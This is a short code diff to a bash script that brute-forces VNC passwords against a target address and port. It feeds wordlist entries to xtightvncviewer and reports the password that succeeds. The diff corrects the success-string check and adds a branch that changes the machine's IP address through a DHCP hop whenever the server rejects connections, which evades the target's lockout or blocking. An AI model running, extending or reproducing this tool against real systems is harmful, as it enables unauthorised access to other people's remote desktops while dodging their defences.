@@ -75,9 +75,9 @@ then
 		xtightvncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
 		sleep 1 # avoid throttling
 		tries=$((tries+1))
-		if grep -q "Authentication succesful" stdout.txt
+		if grep -q "Authentication successful" stdout.txt
 		then
-			echo "[MATCH FOUND]: ${line}"
+			echo "[MATCH FOUND!]: ${line}"
 			echo
 			match=1
 			pkill -f "xtightvncviewer"
@@ -92,6 +92,11 @@ then
 				dhcp_hop
 				tries=0
 			fi
+		elif grep -q "connection has been rejected" stdout.txt
+		then
+			dhcp_hop
+			tries=0
+			pkill -f "xtightvncviewer"
 		else
 			echo "Failed"
 			pkill -f "xtightvncviewer"
